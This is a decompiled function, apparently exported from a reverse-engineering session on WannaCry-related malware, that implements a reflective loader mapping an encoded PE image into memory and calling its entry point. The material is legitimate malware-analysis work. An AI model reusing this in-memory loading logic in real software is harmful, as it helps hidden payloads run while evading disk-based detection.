// --- Metadata ---
// Function Name: Twnry_ReflectiveLoader_4021E9
// Address: 0x4021E9
// Exported At: 20250519_162440
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl Twnry_ReflectiveLoader_4021E9(void *decodedTwnryFile, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  char *v8; // edi
  int v9; // ebx
  int v10; // edx
  char *v11; // ecx
  int v12; // esi
  int v13; // eax
  unsigned int v14; // eax
  HMODULE v15; // eax
  void (__stdcall *v16)(char *); // eax
  int v17; // ecx
  int v18; // esi
  int v19; // ebx
  HANDLE v20; // eax
  unsigned int v21; // eax
  _DWORD *customMemoryStruct; // esi
  char *v23; // eax
  int v24; // eax
  int v25; // eax
  char v27[4]; // [esp+Ch] [ebp-28h] BYREF
  int v28; // [esp+10h] [ebp-24h]
  unsigned int v29; // [esp+30h] [ebp-4h]
  char *v30; // [esp+58h] [ebp+24h]

  v29 = 0;
  if ( !checkBoundary_402457(a2, 0x40u) )
    return 0;
  if ( *decodedTwnryFile != 23117 )
    goto LABEL_3;
  if ( !checkBoundary_402457(a2, *(decodedTwnryFile + 15) + 248) )
    return 0;
  v8 = decodedTwnryFile + *(decodedTwnryFile + 15);
  if ( *v8 != 17744 )
    goto LABEL_3;
  if ( *(v8 + 2) != 332 )
    goto LABEL_3;
  v9 = *(v8 + 14);
  if ( (v9 & 1) != 0 )
    goto LABEL_3;
  v10 = *(v8 + 3);
  if ( *(v8 + 3) )
  {
    v11 = &v8[*(v8 + 10) + 36];
    do
    {
      v12 = *(v11 + 1);
      v13 = *v11;
      if ( v12 )
        v14 = v12 + v13;
      else
        v14 = v9 + v13;
      if ( v14 > v29 )
        v29 = v14;
      v11 += 40;
      --v10;
    }
    while ( v10 );
  }
  v15 = GetModuleHandleA("kernel32.dll");
  if ( !v15 )
    return 0;
  v16 = (a6)(v15, "GetNativeSystemInfo", 0);
  if ( !v16 )
    return 0;
  v16(v27);
  v17 = ~(v28 - 1);
  v18 = v17 & (*(v8 + 20) + v28 - 1);
  if ( v18 != (v17 & (v28 + v29 - 1)) )
  {
LABEL_3:
    SetLastError(0xC1u);
    return 0;
  }
  v19 = (a3)(*(v8 + 13), v18, 12288, 4, a8);
  if ( !v19 )
  {
    v19 = (a3)(0, v18, 12288, 4, a8);
    if ( !v19 )
    {
LABEL_24:
      SetLastError(0xEu);
      return 0;
    }
  }
  v20 = GetProcessHeap();
  v21 = HeapAlloc(v20, 8u, 0x3Cu);
  customMemoryStruct = v21;
  if ( !v21 )
  {
    (a4)(v19, 0, 0x8000, a8);
    goto LABEL_24;
  }
  *(v21 + 4) = v19;
  LOWORD(v21) = *(v8 + 11);
  customMemoryStruct[5] = (v21 >> 13) & 1;
  customMemoryStruct[7] = a3;
  customMemoryStruct[8] = a4;
  customMemoryStruct[9] = a5;
  customMemoryStruct[10] = a6;
  customMemoryStruct[11] = a7;
  customMemoryStruct[12] = a8;
  customMemoryStruct[14] = v28;
  if ( !checkBoundary_402457(a2, *(v8 + 21))
    || (v30 = (a3)(v19, *(v8 + 21), 4096, 4, a8),
        memcpy(v30, decodedTwnryFile, *(v8 + 21)),
        v23 = &v30[*(decodedTwnryFile + 15)],
        *customMemoryStruct = v23,
        *(v23 + 13) = v19,
        !ResolveSectionsFromImage_402470(decodedTwnryFile, a2, v8, customMemoryStruct))
    || ((v24 = *(*customMemoryStruct + 52) - *(v8 + 13)) == 0 ? (customMemoryStruct[6] = 1) : (customMemoryStruct[6] = AdjustImageRelocations_402758(customMemoryStruct, v24)),
        !ResolveAndBindFunctionPointers_4027DF(customMemoryStruct)
     || !ProtectMemorySections_40254B(customMemoryStruct)
     || !RunRegisteredCallbacks_40271D(customMemoryStruct)) )
  {
LABEL_37:
    CleanupCustomMemoryBlock_4029CC(customMemoryStruct);
    return 0;
  }
  v25 = *(*customMemoryStruct + 40);
  if ( v25 )
  {
    if ( customMemoryStruct[5] )
    {
      if ( !((v19 + v25))(v19, 1, 0) )
      {
        SetLastError(0x45Au);
        goto LABEL_37;
      }
      customMemoryStruct[4] = 1;
    }
    else
    {
      customMemoryStruct[13] = v19 + v25;
    }
  }
  else
  {
    customMemoryStruct[13] = 0;
  }
  return customMemoryStruct;
}
